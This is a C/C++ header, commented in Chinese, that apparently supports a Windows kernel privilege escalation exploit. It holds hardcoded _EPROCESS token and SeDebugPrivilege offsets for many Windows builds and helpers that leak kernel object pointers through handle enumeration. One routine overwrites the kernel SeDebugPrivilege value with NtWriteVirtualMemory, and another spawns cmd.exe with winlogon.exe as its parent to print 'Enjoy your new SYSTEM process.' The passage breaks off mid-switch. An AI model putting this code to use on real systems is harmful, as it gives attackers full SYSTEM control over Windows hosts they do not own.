#pragma once
#include <Windows.h>
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <ntstatus.h>
#include <winternl.h>
#include <evntprov.h>
#include <excpt.h>
#include <iostream>
#include <stdexcept>
#include <chrono>

#define MAXIMUM_FILENAME_LENGTH 255

#define SystemExtendedHandleInformation  0x40
#define SystemModuleInformation  0xb
#define SystemHandleInformation 0x10

// ws2019
#define WS19_OFFSET_PID 0x2e0 //dt _EPROCESS UniqueProcessId
#define WS19_OFFSET_PROCESS_LINKS 0x2e8 //dt _EPROCESS ActiveProcessLinks
#define WS19_OFFSET_TOKEN 0x358 //dt _EPROCESS Token

// w1022h2 ws2022
#define W10_OFFSET_PID 0x440 //UniqueProcessId
#define W10_OFFSET_PROCESS_LINKS 0x448 //ActiveProcessLinks
#define W10_OFFSET_TOKEN 0x4b8  //Token

#define WS08_PAGEDATA_NtSeDebugPrivilege_Offset       0xB0
#define WS08R2_PAGEDATA_NtSeDebugPrivilege_Offset    0xB8
#define WS12_PAGEDATA_NtSeDebugPrivilege_Offset       0xB8
#define WS12R2_PAGEDATA_NtSeDebugPrivilege_Offset    0x100 
#define WS16_PAGEDATA_NtSeDebugPrivilege_Offset       0xB48
#define WS19_PAGEDATA_NtSeDebugPrivilege_Offset       0x1538
#define WS22_PAGEDATA_NtSeDebugPrivilege_Offset_1     0x2398 // 2022-1
#define WS22_PAGEDATA_NtSeDebugPrivilege_Offset_5     0x1988 // 2022-5

#define OFFSET_KPROCESS 0x220  //dt nt!_kthread +0x220 Process          : Ptr64 _KPROCESS
#define OFFSET_KPREVIOUSMODE 0x232 //dt nt!_kthread +0x232 +0x232 PreviousMode     : Char
#define WS_PAGEDATA 0xd45000; //PAGEDATA 相对 nt 的偏移

//typedef struct _UNICODE_STRING {
//  USHORT Length; //2字节
//  USHORT MaximumLength; //2字节
//  PWSTR  Buffer;
//} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    ULONG ProcessId;
    UCHAR ObjectTypeNumber;
    UCHAR Flags;
    USHORT Handle;
    void* Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_HANDLE
{
    PVOID Object;
    HANDLE UniqueProcessId;
    HANDLE HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;
typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
    ULONG_PTR HandleCount;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

typedef struct SYSTEM_MODULE {
    ULONG                Reserved1;
    ULONG                Reserved2;
#ifdef _WIN64
    ULONG                Reserved3;
#endif
    PVOID                ImageBaseAddress;
    ULONG                ImageSize;
    ULONG                Flags;
    WORD                 Id;
    WORD                 Rank;
    WORD                 w018;
    WORD                 NameOffset;
    CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;
typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG                ModulesCount;
    SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;


// NtQuerySystemInformation 函数声明
typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );
typedef NTSTATUS NtQueryInformationToken(
    HANDLE                  TokenHandle, //要查询的令牌的句柄
    TOKEN_INFORMATION_CLASS TokenInformationClass,//一个枚举值，指定要查询的令牌信息的类型
    PVOID                   TokenInformation, //指向缓冲区的指针，该缓冲区用于接收查询到的信息。
    ULONG                   TokenInformationLength, //缓冲区的长度，以字节为单位
    PULONG                  ReturnLength //指向一个变量的指针，该变量接收实际返回的令牌信息长度
);

// NtWriteVirtualMemory 将数据写入指定进程的虚拟地址空间
typedef NTSTATUS(*pNtWriteVirtualMemory)(
    IN HANDLE               ProcessHandle, //要写入内存的进程句柄
    IN PVOID                BaseAddress,
    IN PVOID                Buffer,
    IN ULONG                NumberOfBytesToWrite,
    OUT PULONG              NumberOfBytesWritten OPTIONAL
    );
// NtReadVirtualMemory 读取指定进程的虚拟地址空间数据到缓冲区
typedef NTSTATUS(*pNtReadVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    OUT PVOID               Buffer,
    IN ULONG                NumberOfBytesToRead,
    OUT PULONG              NumberOfBytesReaded OPTIONAL
    );
pNtWriteVirtualMemory NtWriteVirtualMemory;
pNtReadVirtualMemory NtReadVirtualMemory;

// 定义系统版本信息结构体
typedef struct OSVERSION {
    DWORD MajorVersion;
    DWORD MinorVersion;
    DWORD BuildNumber;
    DWORD RevisionNumber;
} OSVERSION;

LPCWSTR wCmdPath = L"C:\\Windows\\System32\\cmd.exe";
LPCSTR CmdPath = "C:\\Windows\\System32\\cmd.exe";
LPCWSTR wNtoPath = L"C:\\Windows\\System32\\ntoskrnl.exe";
LPCSTR NtoPath = "C:\\Windows\\System32\\ntoskrnl.exe";

LPCWSTR wNtoRootPath = L"\\SystemRoot\\system32\\ntoskrnl.exe";
LPCSTR NtoRootPath = "\\SystemRoot\\system32\\ntoskrnl.exe";

void ErrorStatusInfo(LPCSTR ErrorMsg, int error)
{
    printf("[-] %s\n", ErrorMsg);
    printf("    └──> %d\n", error);
}


// 通过句柄、进程ID获取内核对象指针
PVOID GetKernelPointerByHandle(HANDLE HandleValue, DWORD ProcPid)
{
    HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
    if (ntdll == NULL) {
        ErrorStatusInfo("GetModuleHandle() failed to get ntdll.", GetLastError());
        return NULL;
    }

    PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (query == NULL) {
        ErrorStatusInfo("GetProcAddress() failed to get NtQuerySystemInformation.", GetLastError());
        return NULL;
    }

    ULONG len = 20;
    NTSTATUS status = (NTSTATUS)0xc0000004;  // STATUS_INFO_LENGTH_MISMATCH
    PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;

    do 
    {
        len *= 2;
        pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
        if (pHandleInfo == NULL) {
            ErrorStatusInfo("GlobalAlloc() failed to alloc pHandleInfo.", GetLastError());
            return NULL;
        }

        status = query(
            (SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, pHandleInfo, len, &len);
        // STATEINFO_LENGTH_MISMATCH 表示缓冲区太小，因此重试
        if (status == (NTSTATUS)0xc0000004) {
            continue;
        }

        // 处理任何其他错误代码
        if (status != 0) {
            ErrorStatusInfo("NtQuerySystemInformation failed.", GetLastError());
            GlobalFree(pHandleInfo);
            return NULL;
        }

        // 在返回的句柄列表中搜索句柄
        for (int i = 0; i < pHandleInfo->HandleCount; i++) 
        {
            PVOID object = pHandleInfo->Handles[i].Object;
            HANDLE handle = pHandleInfo->Handles[i].HandleValue;
            HANDLE pid = pHandleInfo->Handles[i].UniqueProcessId;

            if ((DWORD)pid == ProcPid && handle == HandleValue) {
                GlobalFree(pHandleInfo);
                return object;
            }
        }

    } while (status == (NTSTATUS)0xc0000004);  // 如果缓冲区太小，继续重试

    GlobalFree(pHandleInfo);
    return NULL;
}

// 通过进程名获取 pid
ULONG GetPidByName(LPCWSTR ProcName)
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    ULONG pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) 
        {
            if (wcscmp(entry.szExeFile, ProcName) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);
    return pid;
}


// 创建文件对象返回句柄
// 如果文件存在，则打开文件; 如果文件不存在，则创建新文件
HANDLE CreatFileObject(LPCWSTR FilePath)
{
    HANDLE hFileObject = CreateFileW(FilePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFileObject == INVALID_HANDLE_VALUE) {
        ErrorStatusInfo("Fail to open file.", GetLastError());
        return 0;
    }
    return hFileObject;
}

// 加载一个模块并返回一个模块句柄（用户态地址）需要用 FreeLibrary(NTOUserBase); 释放
// L"ntoskrnl.exe"
HMODULE GetModuleByName(LPCWSTR ModName)
{
    // hKern = LoadLibraryEx(ModName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    // 使用 LoadLibraryEx 加载模块，如果需要解析符号则去掉 DONT_RESOLVE_DLL_REFERENCES 标志
    HMODULE hMod = LoadLibraryEx(ModName, NULL, 0);  // 去掉 DONT_RESOLVE_DLL_REFERENCES 标志
    if (!hMod) {
        ErrorStatusInfo("Failed to obtain module.", GetLastError());
        return NULL;
    }
    return hMod;
}


// 通过模块名获取模块内核基地址
DWORD64 GetModuleAddrByName(LPCSTR ModName)
{
    PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);

    DWORD outBuffer = 0;
    NTSTATUS status = NtQuerySystemInformation(
        (SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);
    if (status == STATUS_INFO_LENGTH_MISMATCH) {
        free(buffer);
        buffer = (PSYSTEM_MODULE_INFORMATION)malloc(outBuffer);
        status = NtQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, outBuffer, &outBuffer);
    }

    if (!buffer) {
        ErrorStatusInfo("Memory allocation failed.", GetLastError());
        return 0;
    }

    for (unsigned int i = 0; i < buffer->ModulesCount; i++)
    {
        PVOID kernelImageBase = buffer->Modules[i].ImageBaseAddress;
        PCHAR kernelImage = (PCHAR)buffer->Modules[i].Name;
        if (_stricmp(kernelImage, ModName) == 0) {
            free(buffer);
            return (DWORD64)kernelImageBase;
        }
    }

    printf("[-] Failed to obtain module base address.\n");
    free(buffer);
    return 0;
}


// 通过模块句柄，函数名获取函数地址（非内核模块句柄）
FARPROC GetFunAddrByModule(HMODULE Mod, const char* FunName)
{
    FARPROC FunAddr = GetProcAddress(Mod, FunName);
    if (!FunAddr) {
        ErrorStatusInfo("Failed to obtain function address.", GetLastError());
        return NULL;
    }
    return FunAddr;
}

// 通过提供的句柄（HANDLE）查找并返回与该句柄关联的内核对象的指针
// 并且检查句柄的对象类型是否与提供的 type 参数相符
DWORD64 GetKernelPointer(HANDLE handle, DWORD type, DWORD ProcPid)
{
    PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

    DWORD outBuffer = 0;
    NTSTATUS status = NtQuerySystemInformation(
        (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);
    if (status == STATUS_INFO_LENGTH_MISMATCH){
        free(buffer);
        buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
        status = NtQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
    }

    if (!buffer){
        ErrorStatusInfo("NtQuerySystemInformation error.", GetLastError());
        return 0;
    }

    for (size_t i = 0; i < buffer->NumberOfHandles; i++)
    {
        DWORD objTypeNumber = buffer->Handles[i].ObjectTypeNumber;
        if (buffer->Handles[i].ProcessId == ProcPid 
            && buffer->Handles[i].ObjectTypeNumber == type)
        {
            // 添加以获取随机对象指针
            if (!handle) {
                printf("   [*] Objdect: %llx ObjectType: %d Handles: %x\n",
                    buffer->Handles[i].Object, buffer->Handles[i].ObjectTypeNumber, buffer->Handles[i].Handle);
                DWORD64 object = (DWORD64)buffer->Handles[i].Object;
                free(buffer);
                return object;
            }

            if (handle == (HANDLE)buffer->Handles[i].Handle){
                DWORD64 object = (DWORD64)buffer->Handles[i].Object;
                free(buffer);
                return object;
            }
        }
    }

    free(buffer);
    return 0;
}

// 通过进程 pid 获得一个可用的文件对象 
// win10 ObjectType 37 ws2022 ObjectType 39
DWORD64 GetFileObjKernelPointer(DWORD ProcPid)
{
    PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

    DWORD outBuffer = 0;
    NTSTATUS status = NtQuerySystemInformation(
        (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);
    if (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        free(buffer);
        buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
        status = NtQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
    }

    if (!buffer)
    {
        ErrorStatusInfo("NtQuerySystemInformation error.", GetLastError());
        return 0;
    }

    for (size_t i = 0; i < buffer->NumberOfHandles; i++)
    {
        DWORD objTypeNumber = buffer->Handles[i].ObjectTypeNumber;
        // \Device\ConDrv 是一个可用的文件对象 Handle 等于4
        if (buffer->Handles[i].ProcessId == ProcPid && buffer->Handles[i].Handle == 4) {
            printf("   [*] Objdect: %llx ObjectType: %d Handles: %x\n",
                buffer->Handles[i].Object, buffer->Handles[i].ObjectTypeNumber, buffer->Handles[i].Handle);
            DWORD64 object = (DWORD64)buffer->Handles[i].Object;
            free(buffer);
            return object;
        }
    }

    free(buffer);
    return 0;
}

// 通过 pattern 查找段
BOOL ScanSectionForPattern(HANDLE hProcess,
    LPVOID lpBaseAddress, SIZE_T dwSize, BYTE* pattern, SIZE_T patternSize, LPVOID* lpFoundAddress)
{
    BYTE* buffer = (BYTE*)malloc(dwSize);
    if (buffer == NULL) {
        return FALSE;
    }

    SIZE_T bytesRead;

    if (!ReadProcessMemory(hProcess, lpBaseAddress, buffer, dwSize, &bytesRead)) {
        free(buffer);
        return FALSE;
    }

    for (SIZE_T i = 0; i < dwSize - patternSize; i++) 
    {
        BOOL found = TRUE;
        for (SIZE_T j = 0; j < patternSize; j++) 
        {
            if (buffer[i + j] != pattern[j]) {
                found = FALSE;
                break;
            }
        }
        if (found) {
            *lpFoundAddress = (LPVOID)((DWORD_PTR)lpBaseAddress + i);
            free(buffer);
            return TRUE;
        }
    }

    free(buffer);
    return FALSE;
}

// 通过字节序列查找指定模块句柄的函数
UINT_PTR FindPattern(HMODULE hModule, BYTE* pattern, SIZE_T patternSize)
{
    UINT_PTR relativeOffset = 0;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    LPVOID lpFoundAddress = NULL;

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        if (strcmp((CHAR*)pSectionHeader[i].Name, "PAGE") == 0){
            LPVOID lpSectionBaseAddress = (LPVOID)((LPBYTE)hModule + pSectionHeader[i].VirtualAddress);
            SIZE_T dwSectionSize = pSectionHeader[i].Misc.VirtualSize;

            if (ScanSectionForPattern(
                GetCurrentProcess(), lpSectionBaseAddress, dwSectionSize, pattern, patternSize, &lpFoundAddress)){
                // 计算相对偏移量
                relativeOffset = (UINT_PTR)lpFoundAddress - (UINT_PTR)hModule;
            }

            break;
        }
    }

    return relativeOffset;
}



typedef LONG(WINAPI* RtlGetVersionFunc)(PRTL_OSVERSIONINFOW);
// 从注册表中读取 UBR 修补版本
DWORD GetOSRevisionNumber()
{
    HKEY hKey;
    if (RegOpenKeyEx(
        HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        DWORD ubr = 0;
        DWORD size = sizeof(ubr);
        if (RegQueryValueEx(hKey, L"UBR", NULL, NULL, (LPBYTE)&ubr, &size) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return ubr;
        }
        else {
            printf("[-] UBR not found.\n");
        }
        RegCloseKey(hKey);
    }
    else {
        printf("[-] Failed to open registry key.\n");
    }

    return 0;
}
//printf("[*] OS Major Version: %d\n", OSVersion->MajorVersion);
//printf("[*] OS Minor Version: %d\n", OSVersion->MinorVersion);
//printf("[*] OS Build Number: %d\n", OSVersion->BuildNumber);
//printf("[*] OS Revision Number: %d\n", OSVersion->RevisionNumber);
// 获取完整系统版本信息：主要版本、次要版本、内部版本、修补版本
void GetFullOSVersion(OSVERSION* OSVersion)
{
    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
    if (hNtDll)
    {
        RtlGetVersionFunc RtlGetVersion = (RtlGetVersionFunc)GetProcAddress(hNtDll, "RtlGetVersion");
        if (RtlGetVersion)
        {
            RTL_OSVERSIONINFOW osInfo = { 0 };
            osInfo.dwOSVersionInfoSize = sizeof(osInfo);
            if (RtlGetVersion(&osInfo) == 0) {
                DWORD dwRevisionNumber = GetOSRevisionNumber();
                OSVersion->MajorVersion = osInfo.dwMajorVersion;
                OSVersion->MinorVersion = osInfo.dwMinorVersion;
                OSVersion->BuildNumber = osInfo.dwBuildNumber;
                OSVersion->RevisionNumber = dwRevisionNumber;
            }
            else {
                printf("[-] Failed to get OS version.\n");
            }
        }
    }
}

// 通过进程句柄设置改句柄为 LocalService 令牌，需要管理员权限
BOOL SetProcessTokenToLocalService(HANDLE hProcess)
{
    HANDLE hProcessToken = NULL;
    HANDLE hLocalServiceToken = NULL;
    BOOL result = FALSE;

    // 1. 打开指定进程的访问令牌
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hProcessToken)) {
        ErrorStatusInfo("Failed to open process token.", GetLastError());
        return FALSE;
    }

    // 2. 使用 LogonUser 函数来模拟 Local Service 帐户
    if (!LogonUserW(L"LocalService", L"NT AUTHORITY", NULL,
        LOGON32_LOGON_SERVICE, LOGON32_PROVIDER_DEFAULT, &hLocalServiceToken)) {
        ErrorStatusInfo("Failed to log on as LOCAL SERVICE.", GetLastError());
        CloseHandle(hProcessToken);
        return FALSE;
    }

    // 3. 创建一个新的主令牌，并设置为 Local Service 帐户
    HANDLE hNewToken = NULL;
    if (!DuplicateTokenEx(hLocalServiceToken, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY,
        NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
        ErrorStatusInfo("Failed to duplicate token.", GetLastError());
    }
    else if (!SetTokenInformation(hNewToken, TokenUser, hLocalServiceToken, sizeof(hLocalServiceToken))) {
        ErrorStatusInfo("Failed to set process token to LOCAL SERVICE.", GetLastError());
    }
    else {
        printf("[+] Successfully replaced token with NT AUTHORITY\\LOCAL SERVICE.\n");
        result = TRUE;
    }

    // 清理句柄
    CloseHandle(hLocalServiceToken);
    CloseHandle(hNewToken);
    CloseHandle(hProcessToken);

    return result;
}

// 启用 Privilege，需要管理员权限
BOOL EnablePrivilege(HANDLE hProcess, LPCWSTR PrivilegeValue) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        ErrorStatusInfo("Failed to open process token.", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, PrivilegeValue, &luid)) {
        ErrorStatusInfo("LookupPrivilegeValue error.", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        ErrorStatusInfo("AdjustTokenPrivileges error.", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}


int SetProcessTokenToLocalServiceTest()
{
    // 打开 LocalService 令牌
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;
    TOKEN_PRIVILEGES priv = { 0 };

    // 获取 LocalService 的令牌
    LPTSTR lpSystemName = NULL; // 本地系统
    LPCWSTR lpUsername = TEXT("NT AUTHORITY\\LocalService");
    WCHAR lpPassword[64] = { 0 }; // LocalService 不需要密码
    DWORD dwLogonFlags = LOGON_WITH_PROFILE;
    DWORD dwLogonType = LOGON32_LOGON_SERVICE;
    DWORD dwLogonProvider = LOGON32_PROVIDER_DEFAULT;

    if (!LogonUser(lpUsername, lpSystemName, lpPassword, dwLogonType, dwLogonProvider, &hToken)) {
        ErrorStatusInfo("LogonUser failed.", GetLastError());
        return 1;
    }

    // 复制令牌
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
        ErrorStatusInfo("DuplicateTokenEx failed.", GetLastError());
        CloseHandle(hToken);
        return 1;
    }

    // 关闭原始令牌
    CloseHandle(hToken);

    // 设置新令牌的权限
    priv.PrivilegeCount = 1;
    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid)) {
        ErrorStatusInfo("LookupPrivilegeValue failed.", GetLastError());
        CloseHandle(hDupToken);
        return 1;
    }

    if (!AdjustTokenPrivileges(hDupToken, FALSE, &priv, 0, NULL, NULL)) {
        ErrorStatusInfo("AdjustTokenPrivileges failed.", GetLastError());
        CloseHandle(hDupToken);
        return 1;
    }

    // 设置进程令牌
    if (!SetThreadToken(NULL, hDupToken)) {
        ErrorStatusInfo("SetThreadToken failed.", GetLastError());
        CloseHandle(hDupToken);
        return 1;
    }

    //std::cout << "Token successfully changed to LocalService." << std::endl;
    printf("[+] Token successfully changed to LocalService.\n");

    // 释放令牌句柄
    CloseHandle(hDupToken);

    return 0;
}

// 获取 CPU 核心数
int GetCoreCount()
{
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    return sysinfo.dwNumberOfProcessors;
}



// 创建线程通过句柄和命令
DWORD CreateProcFromHandleCommand(HANDLE Handle, LPWSTR Command) {
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T size = 0;
    BOOL ret;

    // Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));

    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(),
        0,
        size
    );
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    UpdateProcThreadAttribute(si.lpAttributeList, 
        0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &Handle, sizeof(HANDLE), NULL, NULL);

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Finally, create the process
    ret = CreateProcessW(
        NULL,
        Command,
        NULL,
        NULL,
        true,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        reinterpret_cast<LPSTARTUPINFOW>(&si),
        &pi
    );

    if (ret == false) {
        ErrorStatusInfo("Error creating new process.", GetLastError());
        return 3;
    }

    printf("[+] Enjoy your new SYSTEM process.\n");
    return 0;
}

// 创建 cmd 线程通过句柄
void CreateCmdProcFromHandle(HANDLE hProcess) {
    int error;
    BOOL status;
    SIZE_T size = 0;
    LPVOID lpValue = NULL;
    STARTUPINFOEXW si;
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = NULL;
    wchar_t cmd_process[] = L"C:\\Windows\\System32\\cmd.exe";


    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    // Initialize the thread attribute list
    do
    {
        status = InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
        error = GetLastError();

        if (!status)
        {
            if (si.lpAttributeList != NULL)
                HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

            si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
            ZeroMemory(si.lpAttributeList, size);
        }
    } while (!status && error == ERROR_INSUFFICIENT_BUFFER);

    // Update the thread attribute with the parent process handle
    do
    {
        if (!status)
        {
            ErrorStatusInfo("Failed to initialize thread attribute list.", GetLastError());
            break;
        }

        lpValue = HeapAlloc(GetProcessHeap(), 0, sizeof(HANDLE));
        memcpy(lpValue, &hProcess, sizeof(HANDLE));

        status = UpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            lpValue,
            sizeof(HANDLE),
            NULL,
            NULL
        );

        if (!status)
        {
            ErrorStatusInfo("Failed to update thread attribute.", GetLastError());
            break;
        }

        status = CreateProcessW(
            NULL, 
            (LPWSTR)wCmdPath, 
            NULL, 
            NULL, 
            FALSE, 
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, 
            NULL, 
            NULL, 
            &si.StartupInfo, 
            &pi
        );

        if (!status)
        {
            ErrorStatusInfo("Failed to create new process.", GetLastError());
        }
        else
        {
            printf("[+] New process created successfully.\n");
            printf("    ├──> PID : %lu\n", pi.dwProcessId);
            printf("    └──> TID : %lu\n", pi.dwThreadId);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    } while (0);

    // Clean up allocated memory
    if (lpValue != NULL)
        HeapFree(GetProcessHeap(), 0, lpValue);

    if (si.lpAttributeList != NULL)
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
}
// 弹出 CMD
int spwan_cmd_system()
{
    DWORD winlogonPID;

    winlogonPID = GetPidByName(L"winlogon.exe");
    if (winlogonPID == 0) {
        ErrorStatusInfo("Failed to find winlogon.exe process.", GetLastError());
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, winlogonPID);
    if (!hProcess) {
        ErrorStatusInfo("OpenProcess failed.", GetLastError());
        return 1;
    }

    CreateCmdProcFromHandle(hProcess);

    // We are done
    CloseHandle(hProcess);
    return 0;
}

// 修改 SeDebugPrivilege 内核变量值为 0x17 即可提权（前提是 PreviousMode 为0）
void WSeDebugPrivilege(HANDLE hProc, ULONGLONG SeDebugPrivilegeAddr)
{
    ULONGLONG DebugPrivilege = 0x17;
    NtWriteVirtualMemory(hProc, (PVOID)(SeDebugPrivilegeAddr), &DebugPrivilege, 8, 0);
}
void WSeDebugPrivilegeSelfProc(ULONGLONG SeDebugPrivilegeAddr)
{
    HANDLE hProc = GetCurrentProcess(); //当前线程句柄
    ULONGLONG DebugPrivilege = 0x17;
    NtWriteVirtualMemory(hProc, (PVOID)(SeDebugPrivilegeAddr), &DebugPrivilege, 8, 0);
}

// 获取 ntoskrnl.exe PE 结构中中 PAGEDATA 段的起始地址。
// DWORD baseAddress = GetPagedataSectionBaseAddress(filePath);
DWORD GetPagedataSectionBaseAddress(LPCWSTR filePath)
{
    HANDLE hFile = CreateFileW(filePath,
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return 0;
    }

    BYTE* buffer = new BYTE[fileSize];
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        delete[] buffer;
        CloseHandle(hFile);
        return 0;
    }
    CloseHandle(hFile);

    // 检查 DOS 头
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        delete[] buffer;
        return 0;
    }

    // 跳到 PE 头
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(buffer + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        delete[] buffer;
        return 0;
    }

    // 获取节表
    PIMAGE_SECTION_HEADER pSectionHeaders = IMAGE_FIRST_SECTION(pNtHeaders);

    // 遍历节表寻找 PAGEDATA 节
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i) 
    {
        if (memcmp(pSectionHeaders[i].Name, "PAGEDATA", 8) == 0) {
            DWORD baseAddress = pSectionHeaders[i].VirtualAddress;
            delete[] buffer;
            return baseAddress;
        }
    }

    delete[] buffer;
    return 0; // 如果没有找到PAGEDATA节，返回0
}


void SetNtSeDebugPrivilegeOffsetByOSVersion(OSVERSION& OSVersion,
    DWORD64& PAGEDATA_NtSeDebugPrivilege_Offset)
{
    switch (OSVersion.MajorVersion) {
    case 10:
        switch (OSVersion.BuildNumber) {
        case 14393:
